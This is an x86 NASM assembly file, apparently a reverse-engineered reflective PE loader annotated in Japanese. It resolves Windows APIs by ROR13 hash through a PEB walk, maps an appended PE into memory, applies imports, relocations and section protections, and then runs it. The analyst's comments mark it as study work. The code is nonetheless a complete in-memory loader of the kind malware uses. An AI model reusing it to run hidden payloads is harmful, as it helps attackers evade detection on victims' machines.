
	section .text
	global load
	
load:
	;; 次の命令をcallすることでstack[esp]上に現在のeipを格納
	call    _05
_05:
	;; [esp]の値を取得することで、現在(このpop命令の手前)のInstruction Pointer
	;; を取得
	pop     eax
	mov     ebx,eax
	;; 0x53AはこのPEローダの長さだと思われる。
	;; PEローダの後に、ロードされるPEが存在する事を想定し、その先頭をポイントする。
	add     eax,53Ah
	;; PEローダとロードされたPEの確保されたHeapの大きさは、0x11000であった。
	;; そのため、この0x1093hは確保された領域のかなり後ろを指す。
	add     ebx,1093Ah

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 引数の用意
;;; 5つの引数が設定される
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	;; この引数の下位1bitが立っていると、ImageDosHeaderが0埋めされる
	push    1
	push    5
	push    ebx
	;; daveと書かれた文字列を指す(目的不明)
	push    30627745h
	;; 第1引数がImageの先頭のアドレス([esp+0x5c])
	push    eax
	call    _2d
	;; ここは到達するか不明
	add     esp,14h
	ret
	
_2d:
	sub     esp,48h
	and     dword [esp+18h],0
	mov     ecx,726774Ch
	push    ebx
	push    ebp
        push    esi
	push    edi
        xor     esi,esi

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;ローダ内で使用するWindowsAPIのアドレスを解決
;;; 6つの関数のアドレスが解決される
;;; 解決したアドレスはスタックやレジスタに退避される
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;; kernel32!LoadLIbrary
	call    _467
	mov     ecx,7802F749h
        mov     dword [esp+1Ch],eax
	;; kernel32!GetProcAddress
	call    _467
	mov     ecx,0E553A458h
        mov     dword [esp+20h],eax
	;; kernel32!VirtualAlloc
	call    _467
	mov     ecx,0C38AE110h
        mov     ebp,eax
	;; kernel32!VirtualProtect
	call    _467
	mov     ecx,945CB1AFh
        mov     dword [esp+2Ch],eax
	;; ntdll!NtFlushInstructionCache
	call    _467
	mov     ecx,959E0033h
        mov     dword [esp+30h],eax
	;; kernel32!GetNativeSystemInfo
	call    _467
	mov     ebx,eax

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ImageHeaderの確認処理
;;; 処理としては、Section内のRawDataのサイズがOptionalHeaderのImageSize
;;; と一致しているか確認する為の処理が大部分を示す。
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;; [esp+5ch] == ロードするImageの先頭アドレス	
	mov     eax,dword [esp+5Ch]
	;; IMAGE_DOS_HEADER.e_lfanew取得
	mov     edi,dword [eax+3Ch]
	;; IMAGE_NT_HEADERS先頭アドレス
	add     edi,eax
	mov     dword [esp+10h],edi
	;; IMAGE_NT_HREADERS.Signature == 0x4550の確認
	cmp     dword [edi],4550h
	je      _a7
_a0:
	xor     eax,eax
	jmp     _45f
_a7:
	mov     eax,14Ch
	;; IMAGE_FILE_HEADER.Machine == 0x14Cの確認
	;; -> 32bitコードであるか
	cmp     word [edi+4],ax
	jne     _a0
	;; SectionAlignment(0x18 + 0x20)の最左byteがが1であるか確認
	;; e.g. 0x1000,0x2000
	test    byte [edi+38h],1
	jne     _a0
	;; IMAGE_FILE_HEADER.Sectionの取得
	movzx   edx,word [edi+6]
	;; IMAGE_FILE_HEADER.SizeOfOptionalHeaderの取得
	movzx   eax,word [edi+14h]
	test    edx,edx
	je      _e6
	;; IMAGE_NT_HEADER + 0x24 + SizeOfOptionalHeader
	;; 0x18 = 0x4(IMAGE_NT_HEADER.Signature) + 0x14(IMAGE_FILE_HEADER)
	;; 0x24 - 0x18 == 0x0c
	;; Alignmentがズレていない限り、ImageOptionalHeaderのすぐ後に、
	;; ImageSectionHeaderが開始される。
	;; この場合ImageSectionHeaderの+0x0cにある属性、VirtualAddressのアドレスを指す	
	lea     ecx,[edi+24h]
	add     ecx,eax
_c9:
	;; SizeOfRawData( = IMAGE_SECTION_HEADER.VirtualAddress + 0x4)
	;; が0であるか確認
	cmp     dword [ecx+4],0
	;; VirtualAddressの取得
	mov     eax,dword [ecx]
	jne     _d6
	;; SectionAlignmentの加算
	add     eax,dword [edi+38h]
	jmp     _d9
_d6:
	;; SizeOfRawDataの加算
	add     eax,dword [ecx+4]
_d9:
	;; eaxとesiが異なる場合、esi = eaxとする。
	;; esiの初期値は0である
	cmp     eax,esi
	cmova   esi,eax
	add     ecx,28h
	;; Section数を指しているedxをデクリメント
	;; 0でない場合、_c9に遷移
	sub     edx,1
	jne     _c9

_e6:
	;; ここに至る時点で、esiに全てのセクションのサイズの合計値が入っている
	lea     eax,[esp+34h]
	push    eax
	;; kernel32!GetNativeSystemInfo
	call    ebx
	;; SystemInfo.dwPageSizeを参照
	mov     eax,dword [esp+38h]
	;; ImageOptionalHeader.SizeOfImage取得
	mov     ebx,dword [edi+50h]
	;; dwPageSize-1をコピー
	lea     edx,[eax-1]
	lea     ecx,[eax-1]
	;; bit反転(ページサイズで割れるアドレスの算出の為)
	not     edx
	dec     eax
	;; esi(全セクションのサイズ合計)をページサイズ-1に足す
	add     ecx,esi
	;; SizeOfImageにページサイズ-1を足す
	add     eax,ebx
	;; ページサイズでmod
	and     ecx,edx
	and     eax,edx
	;; OptionalHeaderのSizeOfImageと、SectionHeaderを巡回して算出したImageSize
	;; を比較し、それらが異なる場合、実行しない
	cmp     eax,ecx
	jne     _a0


;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 実行ファイルの仮想アドレスを確保する
;;; ここでは、各セクションのメモリの属性を考慮せず、IMAGE_READ_WRITEとして
;;; 確保する
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	push    4
	push    3000h
	;; ebxには1つ前の処理により確保すべきImageの大きさが入っている	
	push    ebx
	push    0
	;; kernel32!VirtualAlloc
	call    ebp

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ImageHeaderの領域分(SizeOfHeadersの大きさ)を確保した領域にコピーする。
;;; ただし、先頭からImageNtHeadersまでのバイトに関しては、コピーではなく、0が格納される。
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		
	;; OptionalHeader.SizeOfHeaders
	mov     esi,dword [edi+54h]
	mov     ebx,eax
	;; ロードするPEの先頭アドレス
	mov     eax,dword [esp+5Ch]
	xor     ecx,ecx
	mov     dword [esp+14h],eax
	;; コピー先:edx
	mov     edx,ebx
	xor     eax,eax
	mov     dword [esp+18h],ebx
	inc     eax
	mov     dword [esp+24h],eax
	;; SizeOfHeadersが0の場合この処理は行わない
	test    esi,esi
	je      _16c
	;; このスタック上の値は、ローダの先頭付近で与えられた引数の1つで1が格納されている
	mov     ebp,dword [esp+6Ch]
	;; コピー元:ebx
	mov     ebx,dword [esp+14h]
	;; eaxには1が格納されており、ebpの元となった引数の0x1bitが立っていない場合、
	;; 0コピーではなく、通常通りのコピーが行われる
	and     ebp,eax
_13f:
	;; ここからコピー処理に入る。
	;; 1byteずつコピーし、その度に、SizeOfHeadersの値をデクリメントし、
	;; その値が0になったら終了する
	dec     esi
	test    ebp,ebp
	je      _15d
	mov     eax,edi
	sub     eax,dword [esp+5Ch]
	cmp     ecx,eax
	jae     _15d
	cmp     ecx,3Ch
	jb      _158
	cmp     ecx,3Eh
	jbe     _15d
_158:
	;; コピー先に1byteの0を格納
	mov     byte [edx],0
	jmp     _161
_15d:
	;; コピー元から1byte取得し、コピー先に格納
	mov     al,byte [ebx]
	mov     byte [edx],al
_161:
	;; コピー処理のindexをインクリメント
	inc     ecx
	;; コピー元のアドレスをインクリメント
	inc     ebx
	;; コピー先のアドレスをインクリメント
	inc     edx
	test    esi,esi
	;; SizeOfHeaderがまだ残っていたら引き続きこの処理を続ける
	jne     _13f
	
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; Section内のRawDataのコピーを行う
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	mov     ebx,dword [esp+18h]
_16c:
	;; eax = NumberOfSections
	movzx   eax,word [edi+6]
	;; ecx = SizeOfOptionalHeaders
	movzx   ecx,word [edi+14h]
	;; NumberOfSections == 0だったらこの処理は行わない
	test    eax,eax
	je      _1b0
	;; ecxが0x2c + OptionalHeaderを指す。
	;; 1つの目のSectionHeaderの+0x14(0x2c-0x18),PointerToRawDataを指す.	
	add     edi,2Ch
	add     ecx,edi
	mov     edi,dword [esp+5Ch]

_181:
	;; edx = ImageSectionHeader.VirtualAddress
	mov     edx,dword [ecx-8]
	;; 残りのセクション数をデクリメント
	dec     eax
	;; esi = PointerToRawData
	mov     esi,dword [ecx]
	;; コピー先の先頭アドレス
	add     edx,ebx
	;; ebp = SizeOfRawData
	mov     ebp,dword [ecx-4]
	;; ediはPEの先頭を指しており、実際のデータ領域をesiは指す
	add     esi,edi
	mov     dword [esp+5Ch],eax
	test    ebp,ebp	
	je      _1a5
_196:
	;; esi(実際のPEの開始アドレス+PointerToRawData/コピー元)から
	;; edx(コピー先の先頭アドレス+VirtualAddress/コピー先)へコピー
	mov     al,byte [esi]
	mov     byte [edx],al
	;; コピー先のアドレスをインクリメント
	inc     edx
	;; コピー元のアドレスをインクリメント
	inc     esi
	;; ebpに格納された残りのSizeOfRawDataが0になっていたら終了
	sub     ebp,1
	jne     _196
	
	mov     eax,dword [esp+5Ch]
_1a5:
	add     ecx,28h
	;; 残りのSection数が0なら終了
	test    eax,eax
	jne     _181

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ImageImportDescriptor内のWindowsAPIのアドレスの解決を行う
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	mov     edi,dword [esp+10h]
_1b0:
	;; 0x80 = 0x18 + ImageOptionalHeader(0x60) + 0x8(ImageExportDirectory)
	;; ImageDirectoryEntryImportのVirtualAddressを指す
	mov     esi,dword [edi+80h]
	;; ロード先のImageImportDescriptorのアドレスを算出
	add     esi,ebx
	mov     dword [esp+14h],esi
	;; ImageImportDescriptor+0xcよりName(IATへのポインタ)を取得
	mov     eax,dword [esi+0Ch]
	;; 0ならばImport関数の解決は不要
	test    eax,eax
	je      _240
	;; ロード先のBaseAddressを考慮
_1c3:	
	add     eax,ebx
	push    eax
	;; LoadLibraryを呼び出す
	call    dword [esp+20h]
	;; FirstThunkの確認
	mov     ebp,dword [esi+10h]
	mov     edi,eax
	mov     eax,dword [esi]
	add     ebp,ebx
	add     eax,ebx
	mov     dword [esp+5Ch],eax
	cmp     dword [ebp],0
	je      _22e
	mov     esi,dword [esp+20h]
_1e3:
	mov     ecx,dword [eax]
	test    ecx,ecx
	je      _207
	jns     _207
	mov     eax,dword [edi+3Ch]
	movzx   ecx,cx
	mov     eax,dword [eax+edi+78h]
	sub     ecx,dword [eax+edi+10h]
	mov     eax,dword [eax+edi+1Ch]
	lea     eax,[eax+ecx*4]
	mov     eax,dword [eax+edi]
	add     eax,edi
	jmp     _213
_207:
	mov     eax,dword [ebp]
	add     eax,2
	add     eax,ebx
	push    eax
	push    edi
	;; GetProcAddressを呼び出す
	call    esi
_213:
	mov     dword [ebp],eax
	add     ebp,4
	mov     eax,dword [esp+5Ch]
	add     eax,4
	mov     dword [esp+5Ch],eax
	cmp     dword [ebp],0
	;; 次のImageThunkDataを確認
	jne     _1e3
	mov     esi,dword [esp+14h]
_22e:
	mov     eax,dword [esi+20h]
	add     esi,14h
	mov     dword [esp+14h],esi
	test    eax,eax
	;; 次のImageImportDescriptorを確認
	jne     _1c3

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 動的リロケーション(BaseRelocエントリの処理)を行う
;;; 基本的に二重ループになっており、
;;; 複数のBlockの巡回処理、Block内の巡回処理が存在する。
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	mov     edi,dword [esp+10h]
_240:	
	mov     ebp,ebx
	;; ebp = ImageBase
	sub     ebp,dword [edi+34h]
	;; 0xa4 = (0x18 + 0x60 + 0x8 * 5)
	;; 6個目のImageDirectoryEntryのSizeを計算している。
	;; つまり、ImageDirectoryEnetyBaseRelocのそれである。
	cmp     dword [edi+0A4h],0
	;; 仮に、Sizeが0ならこの処理は行わない
	je      _2fc
	;; BaseRelocのVirtualAize(ロード先のアドレス)を計算
	mov     edx,dword [edi+0A0h]
	add     edx,ebx
	mov     dword [esp+5Ch],edx
	;; ecxにはロード先の先頭アドレス+BaseRelocのVirtualAddressを格納
	;; この値にOffsetを足し合わせたアドレスが書き換え対象となる
	lea     ecx,[edx+4]
	mov     eax,dword [ecx]
	mov     dword [esp+14h],ecx
	test    eax,eax
	je      _2fc
_26f:	
	mov     esi,dword [edx]
	lea     edi,[eax-8]
	add     esi,ebx
	lea     eax,[edx+8]
	shr     edi,1
	mov     dword [esp+20h],eax
	je      _2e1
	push    2
	mov     ebx,eax
	pop     edx
;;; 同一Block内のtype+offsetを巡回する
_286:
	movzx   ecx,word [ebx]
	dec     edi
	mov     ax,cx
	shr     ax,0Ch
	cmp     ax,0Ah
	je      _29d
	cmp     ax,3
	jne     _2a8
_29d:
	and     ecx,0FFFh
	;; Type == 3(IMAGE_REL_BASED_HIGHLOW)の時、ebpを足し合わせ
	add     dword [ecx+esi],ebp
	jmp     _2cf
_2a8:
	cmp     ax,word [esp+24h]
	jne     _2c0
	and     ecx,0FFFh
	mov     eax,ebp
	shr     eax,10h
	;; Type == 1(IMAGE_REL_BASED_HIGH) high bitのみ足し合わせる為、
	;; shift rightしてから足し合わせ
	add     word [ecx+esi],ax
	jmp     _2cf
_2c0:
	cmp     ax,dx
	jne     _2cf
	and     ecx,0FFFh
	;; Type == 2(IMAGE_REL_BASED_LOW) row bitのみ足す	
	add     word [ecx+esi],bp
_2cf:
	;; type+offset == 2byteのため、2を足す
	add     ebx,edx
	test    edi,edi
	;; SizeOfBlockが0にならない限り、type+offsetを巡回する
	jne     _286
	
	mov     ebx,dword [esp+18h]
	mov     edx,dword [esp+5Ch]
	mov     ecx,dword [esp+14h]
_2e1:
	add     edx,dword [ecx]
	mov     dword [esp+5Ch],edx
	lea     ecx,[edx+4]
	mov     eax,dword [ecx]
	mov     dword [esp+14h],ecx
	test    eax,eax
	;; 残りのBlockが存在する場合、再度巡回する
	jne     _26f

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; Sectionのメモリ属性を変更
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	mov     edi,dword [esp+10h]
	
_2fc:
	;; SectionSizeとSizeOfOptionalHeader
	movzx   eax,word [edi+6]
	movzx   ecx,word [edi+14h]
	test    eax,eax
	je      _3c3
	mov     esi,dword [esp+5Ch]
	lea     ebp,[edi+3Ch]
	add     ebp,ecx
_315:	
	dec     eax
	cmp     dword [ebp-14h],0
	mov     dword [esp+24h],eax
	jbe     _3b8
	mov     ecx,dword [ebp]
	xor     edx,edx
	inc     edx
	mov     eax,ecx
	shr     eax,1Dh
	and     eax,edx
	mov     edx,ecx
	shr     edx,1Eh
	and     edx,1
	shr     ecx,1Fh
	test    eax,eax
	jne     _358
	jne     _34b
	push    8
	pop     esi
	push    1
	jmp     _350
_34b:
	push    4
	pop     esi
	push    2
_350:
	test    ecx,ecx
	pop     eax
	cmove   esi,eax
	jmp     _384
_358:
	test    edx,edx
	jne     _373
	test    ecx,ecx
	jne     _364
	push    10h
	jmp     _379
_364:	
	test    edx,edx
	jne     _373
	test    ecx,ecx
	je      _384
	mov     esi,80h
	jmp     _384
_373:	
	test    ecx,ecx
	jne     _37c
	push    20h
_379:	
	pop     esi
	jmp     _384
_37c:
	push    40h
	test    ecx,ecx
	pop     eax
	cmovne  esi,eax
_384:
	mov     ecx,dword [ebp]
	mov     eax,esi
	or      eax,200h
	and     ecx,4000000h
	cmove   eax,esi
	lea     eax,[esp+28h]
	push    eax
	mov     eax,dword [ebp-18h]
	push    esi
	push    dword [ebp-14h]
	add     eax,ebx
	push    eax
	;; VirtualProtectを呼び出す
	call    dword [esp+3Ch]
	test    eax,eax
	je      _a0
	mov     eax,dword [esp+24h]
_3b8:	
	add     ebp,28h
	test    eax,eax
	jne     _315

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; EntryPointの実行
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_3c3:
	;; esi = entrypoint
	mov     esi,dword [edi+28h]
	push    0
	push    0
	push    0FFFFFFFFh
	add     esi,ebx
	;; NtFlushInstructionCacheを呼び出す
	call    dword [esp+3Ch]
	xor     eax,eax
	inc     eax
	push    eax
	push    eax
	push    ebx
	;; entrypointの実行
	call    esi

	cmp     dword [esp+60h],0
	je      _45d
	cmp     dword [edi+7Ch],0
	je      _45d
	mov     ecx,dword [edi+78h]
	add     ecx,ebx
	mov     eax,dword [ecx+18h]
	test    eax,eax
	je      _45d
	cmp     dword [ecx+14h],0
	je      _45d
	mov     ebp,dword [ecx+20h]
	mov     edi,dword [ecx+24h]
	add     ebp,ebx
	and     dword [esp+5Ch],0
	add     edi,ebx
	test    eax,eax
	je      _45d
_40c:
	mov     esi,dword [ebp]
	add     esi,ebx
	xor     edx,edx
_413:	
	movsx   eax,byte [esi]
	ror     edx,0Dh
	add     edx,eax
	inc     esi
	cmp     byte [esi-1],0
	jne     _413
	cmp     dword [esp+60h],edx
	je      _43e
	mov     eax,dword [esp+5Ch]
	add     ebp,4
	inc     eax
	add     edi,2
	mov     dword [esp+5Ch],eax
	cmp     eax,dword [ecx+18h]
	jb      _40c
	jmp     _45d
_43e:
	movzx   edx,word [edi]
	cmp     edx,0FFFFFFFFh
	je      _45d
	mov     eax,dword [ecx+1Ch]
	push    dword [esp+68h]
	push    dword [esp+68h]
	lea     eax,[eax+edx*4]
	mov     eax,dword [eax+ebx]
	add     eax,ebx
	call    eax
	pop     ecx
	pop     ecx
_45d:	
	mov     eax,ebx
_45f:	
	pop     edi
	pop     esi
	pop     ebp
	pop     ebx
	add     esp,48h
	ret

;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; GetProcAddress相当の役割を示すと思われる
;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_467:	
	sub     esp,10h
	mov     eax,[fs:30h]
	push    ebx
	push    ebp
	push    esi
	mov     eax,dword [eax+0Ch]
	push    edi
	mov     dword [esp+18h],ecx
	mov     esi,dword [eax+0Ch]
	jmp     _50d
_483:	
	mov     eax,dword [esi+30h]
	xor     ecx,ecx
	mov     ebx,dword [esi+2Ch]
	mov     esi,dword [esi]
	mov     dword [esp+14h],eax
	mov     eax,dword [edx+3Ch]
	mov     ebp,dword [eax+edx+78h]
	mov     dword [esp+10h],ebp
	test    ebp,ebp
	je      _50d
	shr     ebx,10h
	xor     edi,edi
	test    ebx,ebx
	je      _4c8
	mov     ebp,dword [esp+14h]
_4ad:	
	mov     al,byte [edi+ebp]
	ror     ecx,0Dh
	cmp     al,61h
	movsx   eax,al
	jl      _4bd
	add     ecx,0FFFFFFE0h
_4bd:	
	add     ecx,eax
	inc     edi
	cmp     edi,ebx
	jb      _4ad
	mov     ebp,dword [esp+10h]
_4c8:	
	mov     eax,dword [edx+ebp+20h]
	xor     ebx,ebx
	mov     edi,dword [edx+ebp+18h]
	add     eax,edx
	mov     dword [esp+14h],edi
	test    edi,edi
	je      _50d
_4dc:	
	mov     ebp,dword [eax]
	xor     edi,edi
	add     ebp,edx
	add     eax,4
	mov     dword [esp+1Ch],eax
_4e9:	
	movsx   eax,byte [ebp]
	ror     edi,0Dh
	add     edi,eax
	inc     ebp
	cmp     byte [ebp-1],0
	jne     _4e9
	lea     eax,[edi+ecx]
	cmp     eax,dword [esp+18h]
	je      _522
	mov     eax,dword [esp+1Ch]
	inc     ebx
	cmp     ebx,dword [esp+14h]
	jb      _4dc
_50d:	
	mov     edx,dword [esi+18h]
	test    edx,edx
	jne     _483
	xor     eax,eax
_51a:	
	pop     edi
	pop     esi
	pop     ebp
	pop     ebx
	add     esp,10h
	ret

_522:	
	mov     esi,dword [esp+10h]
	mov     eax,dword [esi+edx+24h]
	lea     eax,[eax+ebx*2]
	movzx   ecx,word [eax+edx]
	mov     eax,dword [esi+edx+1Ch]
	lea     eax,[eax+ecx*4]
	mov     eax,dword [eax+edx]
	add     eax,edx
	jmp     _51a

